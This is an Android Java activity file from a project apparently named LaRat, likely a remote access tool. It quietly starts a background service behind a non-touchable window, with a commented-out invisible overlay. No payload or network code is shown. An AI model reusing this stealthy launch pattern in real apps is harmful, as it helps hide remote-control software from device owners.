package com.c4wd.larat;

import android.app.Activity;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.opengl.GLSurfaceView;
import android.os.Bundle;
import android.util.Log;
import android.view.WindowManager;

public class LaRatActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);

        /*GLSurfaceView view = new GLSurfaceView(this);
        view.setRenderer(new OpenGLRenderer());
        view.getHolder().setFormat(PixelFormat.TRANSLUCENT);
        view.setZOrderOnTop(true);
        setContentView(view);*/

        if (!LaRatServiceReceiver.IsServiceRunning(getApplicationContext())) {
            startService(new Intent(getApplicationContext(), LaRatService.class));
            Log.i("com.c4wd.larat", "Starting the LaRat service...");
        }
    }
}
